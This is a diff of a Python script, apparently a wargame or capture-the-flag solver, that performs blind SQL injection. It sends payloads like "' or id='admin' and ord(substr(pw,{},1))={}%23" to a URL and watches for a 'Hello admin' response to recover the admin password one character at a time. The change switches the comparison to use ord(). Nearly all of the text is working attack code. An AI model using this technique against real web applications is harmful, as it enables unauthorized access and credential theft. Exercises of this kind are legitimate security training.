@@ -24,8 +24,8 @@ print("[+] Get Password Length : " + str(password_len))
 for idx in range(1, password_len + 1):
     for i in string_data:
         # data = "?pw=' or id='admin' and pw like '{}{}%".format(password,i)
-        # data = "?pw=' or id='admin' and ord(substr(pw,{},1))={}%23".format(idx,ord(i))
-        data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
+        # data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
+        data = "?pw=' or id='admin' and ord(substr(pw,{},1))={}%23".format(idx,ord(i))
         # print(data)
         response = requests.get(url + data, headers=header)
         if response.text.find("Hello admin") != -1:
